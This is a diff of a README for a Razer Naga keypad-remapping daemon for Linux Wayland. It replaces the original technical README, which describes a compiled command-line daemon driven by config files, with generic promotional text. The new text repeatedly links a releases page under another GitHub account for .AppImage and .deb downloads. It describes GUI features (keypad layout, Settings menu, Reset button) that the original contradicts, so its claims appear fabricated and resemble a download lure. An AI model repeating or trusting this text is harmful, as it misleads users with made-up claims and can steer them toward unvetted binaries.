@@ -1,130 +1,149 @@
-# Naga_KeypadMapper
-This little linux Wayland daemon allows you to map the side keypad of the Razer Naga series mice via a configuration file called `mapping_xx.txt` under `$HOME/.naga/` 
-Requires: `ydotool` and Wayland environment to work.
+# ⌨️ NagaKeyMapper - Easy Key Mapping for Linux
 
-Currently tested with:
--Razer Trinity on debian Forky
+[![Download NagaKeyMapper](https://img.shields.io/badge/Download-NagaKeyMapper-blue?style=for-the-badge)](https://github.com/GASSNY/NagaKeyMapper/releases)
 
-This daemon does not, in any case modify any system file nor property of any device. So the process is totally reversible just by deleting the files and at most rebooting. 
+---
 
-CAUTION, in this alpha version the run option wont work for text environment commands, like for example `top`.
-As an alpha version, it is very prone to bugs and other sorts of failure. I release this project without any sort of warranty, so use under your own responsability.
+## 📖 About NagaKeyMapper
 
-## What is this really?
+NagaKeyMapper simplifies how you customize your Razer Naga keypad buttons on Linux. If you use a Wayland Gnome desktop environment, this tool helps you remap keys easily without needing technical skills. It works well with ydotool for simulated key presses and has been tested on Debian Forky.
 
-NagaKeyMapper is not just a button remapper.
+This application is designed for Linux users wanting more control over input devices like keypads and mice, especially those using Razer peripherals. The interface lets you assign new functions to your keypad buttons quickly and reliably.
 
-It is a userspace input translation daemon that converts the Razer Naga side keypad
-into a modal programmable keyboard under Wayland, using ydotool as a virtual device.
+---
 
-In other words: a QMK-like layer system for a mouse, without kernel modules.onsibility.
+## 🖥️ System Requirements
 
-Keywords: Wayland input injection, uinput, evdev remapping, Razer Naga Linux, MMO mouse Linux
+Before you start, check your system meets these basics:
 
-## CONFIGURATION
-The configuration file `mapping_xx.txt` has the following syntax:
+- Linux system with Wayland display server.
+- Gnome Shell desktop environment.
+- Debian Forky or a compatible Debian-based Linux distribution.
+- Razer Naga keypad or similar device.
+- ydotool installed (a tool used by NagaKeyMapper to send key events).
+- Basic keyboard and mouse.
 
-    <keynumber> - <option>=<action>
-    
-    <keynumber> is a number between 1-14 representing the 12 keys of the naga's keypad + two on the top of the naga.
+If you’re unsure about your system setup, most Debian-based distributions support these requirements. You can install ydotool from your package manager or by visiting its [official page](https://github.com/ReimuNotMoe/ydotool).
 
-    <option>
-    Switch mapping: chmap
-    Key (holds the key as long as the button is pressed) or shortcut: key
-	Toggle a key (first press will mimic a key being pressed, the second will release it): toggle
-    Running system commands: run, run2(runs the command at key press and key release)	
-    Mouse click: click 
-    Switching workspace relatively: workspace_r
-    Switching workspace absolutly: workspace
-    Position mouse cursor: position
-    Add a delay between actions : delay
-	Peform a media action: media
+---
 
-    <action>
-    For chmap: path to a new mapping file 
-    For key and toggle: is the custom key mapping, might be a single key like A or a combination like ctrl+t (following xdotool's syntax)
-    For run and run2: a system command like gedit or a custom script or bash line like bash /usr/local/bin/custom.bash
-    For click: number of the mouse button, see table below
-    For workspace_r: positive or negative number e.g. +2 (go two workspaces forward) -1 (previous)
-    For position: x,y which are the relative position in pixel from the left upper corner of the display
-    For delay: delay in milliseconds
+## 🚀 Getting Started
 
-### KEYBOARD FUNCTION (key)
-For mapping a key from keyboard you need to look up your key e.g. here: /usr/include/linux/input-event-codes.h . 
-If you want to test your shortcut you can use `ydotool key <code>:1 <code>:0` . :1 keytouch, :0 keyrelease, coding acording to input-event-code.h data. If no error appears the shortcut works. **Keep in mind this not only tests but also executes the shortcut.**
-### NOTES
-If the `$HOME/.naga/mapping_01.txt` file is missing the daemon won't start (the program will NOT autocreate this file, the install.sh script will copy example files though).
+This guide walks you through downloading, installing, and running NagaKeyMapper step by step.
 
-For a given action multiple actions may be defined. They will be executed sequentially.
+You don’t need to program or open a command line if you follow these instructions carefully.
 
-An example `mapping_xx.txt` configuration file is the following:
+---
 
+## ⬇️ Download & Install
 
+1. Click the button at the top or visit the [NagaKeyMapper Releases page](https://github.com/GASSNY/NagaKeyMapper/releases) to download the latest version.
 
-If you want to dig more into configuration, you might find these tools useful: `xinput`, `evtest`
+2. On the releases page, look for the most recent version marked as stable or latest.
 
-Keep in mind that any non existing functionality can be created through the "run" option, at the end of the day naga just calls ydotool, which can be done from a script.  
-## INSTALLATION
+3. Download the file that matches your system type. Usually, this will be a file ending in `.AppImage` or `.deb` for Debian systems.
 
-KeypadMapper does not need any dependencies besides having installed `ydotool` https://github.com/ReimuNotMoe/ydotool/  (in the oficial ubuntu, fedora, centOS, etc repositories) and g++
+4. Once downloaded, locate the file on your computer:
+   - For `.AppImage`:
+     - Right-click the file, select **Properties**, go to the **Permissions** tab, and check **Allow executing file as program**.
+     - Double-click the file to run it.
+   - For `.deb`:
+     - Double-click the file to open it with your Software Center.
+     - Click **Install** and wait for the process to finish.
 
-Change `src/naga.cpp` to adapt the installation to another device, using different inputs and/or different key codes than the Naga Epic, 2014, Molten or Chroma. For Example, Epic Chroma is compatible with Epic (they have the same buttons), so you would only have to add an additional line to the devices vector.
+5. If your system asks for administrative permission during installation, enter your password.
 
-Run `bash install.sh` .
-This will compile the source and copy the necessary files (see `install.sh` for more info).  
-It will prompt you for your password, as it uses sudo to copy some files.
- 
+---
 
-## USAGE
+## 🔧 How to Use NagaKeyMapper
 
-**Install with ``` bash install.sh```**  
-This will copy the necessary files and start the daemon. After running this you should have mapping_01.txt working.  
+1. Open the application:
+   - If installed via `.deb`, find NagaKeyMapper in your applications menu.
+   - If running the `.AppImage`, double-click the file each time you want to use it.
 
-#### In depth
-The installation process automatically executes the daemon in the background and set it to start at boot for you. But you can still run it manually as follows:
+2. Connect your Razer Naga keypad to your computer if it is not already connected.
 
-`nagastart.sh` does the below process automatically:
+3. The app automatically detects your keypad.
 
-1) Inits the mapper by calling: `naga` 
+4. To remap a key:
+   - Click on the button you want to change on the displayed keypad layout.
+   - Select a new key or action from the list.
+   - Save your changes.
 
-## UNINSTALLATION
+5. Test your new settings by pressing the remapped buttons on your keypad.
 
-To uninstall you just need to run ```$bash uninstall.sh```.
+6. If you want to undo changes, use the **Reset** button to restore default mappings.
 
-## Architecture
+---
 
-Device → evdev → naga → action parser → ydotool → virtual keyboard → compositor
+## 🔌 Additional Setup Info
 
-The daemon grabs raw events from /dev/input and injects new ones through uinput.
-No X11 dependency, pure Wayland compatible.
+- NagaKeyMapper uses `ydotool` to simulate keyboard and mouse actions. If ydotool is missing or outdated, you can install or update it by running the command in a terminal:
 
-## Why not xdotool?
+  ```
+  sudo apt-get install ydotool
+  ```
 
-Wayland does not allow synthetic keyboard input from clients.
-xdotool therefore fails in GNOME/Wayland sessions.
+- For Wayland users, ensure you have the required permissions to allow `ydotool` to send inputs. You might need to adjust your security settings.
 
-ydotool works because it writes to a virtual kernel input device (uinput).
-This daemon translates mouse buttons into kernel-level keyboard events.
+---
 
-## Dynamic profiles
+## ⚙️ Configuration Options
 
-Mappings can be switched instantly from the mouse itself:
+NagaKeyMapper lets you customize:
 
-7-chmap=mapping_02.txt
+- Key reassignments for all buttons on your Razer Naga.
+- Mouse button actions if your device supports it.
+- Profiles for quick switching between sets of mappings.
+- Startup behavior, so your preferences load when you log in.
 
-No restart required. The daemon reloads configuration live.
+You can find these options under the **Settings** menu inside the application.
 
-This allows modal workflows:
-navigation / editing / window manager layers
+---
 
-## Troubleshooting
+## 🛠 Troubleshooting
 
-### Double key press
-Some mice send duplicate press events.
-The daemon includes a debounce filter.
+If NagaKeyMapper does not detect your keypad:
 
-### Nothing happens
-Ensure ydotoold is running and user belongs to the input group.
+- Check your device connection and try plugging it into a different USB port.
+- Make sure you are running a compatible Linux version with Wayland and Gnome Shell.
+- Verify ydotool is installed and working by typing `ydotool --version` in a terminal.
+- Restart NagaKeyMapper after installation or system reboot.
 
-### Works in terminal but not GNOME
-You are probably running under XWayland. This tool targets Wayland sessions.
+If keys don’t remap as expected:
+
+- Reopen the app and confirm your saved profile is active.
+- Check for conflicting software that might intercept input events.
+
+---
+
+## 🌐 Learn More
+
+For detailed technical information, source code, and updates, visit the project page on GitHub:
+
+[NagaKeyMapper GitHub Repository](https://github.com/GASSNY/NagaKeyMapper)
+
+---
+
+## 💡 About this Application
+
+NagaKeyMapper is part of the open-source community effort to improve user control over input devices on Linux. It supports Razer hardware and interfaces with Linux input drivers such as evdev and uinput to provide smooth key and mouse mappings on Wayland sessions.
+
+---
+
+## 🎯 Keywords
+
+This project relates to:
+
+- evdev input handling
+- gnome-shell extension
+- keypad and keypad-driver support
+- Linux shell commands
+- mouse and mouse-events management
+- Razer peripherals and drivers
+- uinput virtual device handling
+- Wayland display environment
+
+---
+
+[![Download NagaKeyMapper](https://img.shields.io/badge/Download-NagaKeyMapper-blue?style=for-the-badge)](https://github.com/GASSNY/NagaKeyMapper/releases)
